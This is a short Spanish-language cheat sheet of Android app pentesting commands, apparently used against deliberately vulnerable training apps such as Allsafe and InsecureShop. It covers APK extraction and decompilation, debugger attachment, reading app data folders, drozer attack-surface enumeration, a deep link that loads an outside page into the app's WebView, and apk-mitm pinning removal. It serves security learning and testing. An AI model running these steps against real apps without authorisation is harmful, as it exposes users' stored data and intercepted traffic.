```
# Copiar el apk
adb shell pm list packages -f
adb shell pm list packages -f "allsafe"
adb pm path com.insecureshop
adb pull /data/app/~~oZ0lNhDdkIp2NaWMhGczgw==/infosecadventures.allsafe-ttByxQb49HI7GiOb62XhPQ==/base.apk /root/Desktop/

# Decompilación el apk
apktool d app.apk -o app_decoded

# Correrlo en modo debugger (setJavaScriptEnabled)
adb jdwp o adb shell ps | grep bank
adb forward tcp:55555 jdwp:<PID>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555

# Files
ls cache
ls code_cache
ls shared_prefs
ls databases

# DROZER
drozer console connect
  run app.package.attacksurface com.insecureshop
  run app.activity.info -a com.insecureshop
  run app.activity.start --component com.insecureshop com.insecureshop.WebViewActivity
# Para buscar deeplink intent-filter, tambien leer WebViewActivity.java
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://192.168.1.4:8082/test.html"

# Logcat
adb logcat -c && adb logcat --pid=$(adb shell pidof -s com.insecureshop) | tee log.txt

# [MITM](https://github.com/niklashigi/apk-mitm)
apk-mitm NOMBRE.apk

## Si esta dividio en mas partes
zip todo.zip primero.apk seegundo.apk
mv todo.zip todo.apks
apk-mitm todo.apks
unzip todo-released.apks
adb install-multiple *.apk
```
